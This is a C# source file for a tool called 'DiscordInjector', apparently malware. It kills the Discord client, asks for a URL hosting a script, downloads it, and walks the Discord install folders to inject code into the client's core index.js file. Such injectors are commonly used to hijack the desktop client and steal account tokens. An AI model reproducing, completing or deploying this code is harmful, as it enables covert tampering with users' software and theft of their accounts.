using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace DiscordInjector
{
    internal class Program
    {

        static void Main(string[] args)
        {
            ScriptInjector.ClientKiller();
            Console.Title = $"[{Utils.Time()}] DiscordInjector by Cabbo";
            Console.WriteLine($"[{Utils.Time()}] Please provide a valid URL:");
            ScriptInjector.FileHoster = Console.ReadLine();
            ScriptInjector.Downloader();
            ScanForClient();
            Utils.Leave();
        }
        public static void ScanForClient()
        {
            foreach (string client in Directory.GetDirectories(ClientPath.LocalPath))
            {
              if (client.Contains("cord"))
              {
                    foreach (string folder in Directory.GetDirectories(client))
                    {
                        if (folder.Contains("app"))
                        {
                            foreach (string modules in Directory.GetDirectories(folder))
                            {
                                if (modules.Contains("modules"))
                                {
                                    foreach (string core in Directory.GetDirectories(modules))
                                    {
                                        if (core.Contains("core"))
                                        {
                                            foreach (string finalcore in Directory.GetDirectories(core))
                                            {
                                                if (finalcore.Contains("core"))
                                                {
                                                    string IndexJS = finalcore + @"\index.js";
                                                    ScriptInjector.Injector(IndexJS);
                                                }
                                                else
                                                {
                                                }
                                            }
                                        }
                                        else
                                        {
                                        }
                                    }
                                }
                                else
                                {
                                }
                            }
                        }
                        else
                        {
                        }
                    }
                }
              else
              {
              }
            }
        }
    }
}
